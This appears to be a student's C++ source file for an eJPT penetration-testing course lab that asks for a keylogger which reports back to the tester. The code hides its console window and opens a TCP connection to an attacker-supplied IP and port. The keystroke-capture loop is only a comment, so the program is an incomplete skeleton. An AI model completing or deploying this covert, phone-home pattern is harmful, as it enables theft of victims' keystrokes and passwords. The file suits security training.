/*
CJ Pfenninger
06/04/2020
www.elearnsecurity.com
Pentest Student Course, eJPT Certification
C++ Programming Lab, Task 2: Create a simple keylogger that sends any collected information back to the penetration tester.
To compile:
    g++ keylogger.cpp -o keylogger.exe -lws2_32 -std=c++17
To execute:
    keylogger.exe [IP ADDRESS] [PORT]
*/
#define _WIN32_WINNT 0x501

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <WinUser.h>

using namespace std;

int main(int argc, char* argv[])
{
    int iResult;
    iResult = ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsaData;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    SOCKET ConnectSocket = INVALID_SOCKET;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    // getaddrinfo is used to determine the values in the sockaddr structure.
    // The information in the sockaddr structure includes IP address of the server to connect to and the port number to use for that connection.
    iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return 1;
    }

    ptr = result;
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    // Check for errors to ensure valid socket
    if (ConnectSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Connect to server
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Begin an infinite loop that will grab every keystroke and send them over the socket.

    return 0;
}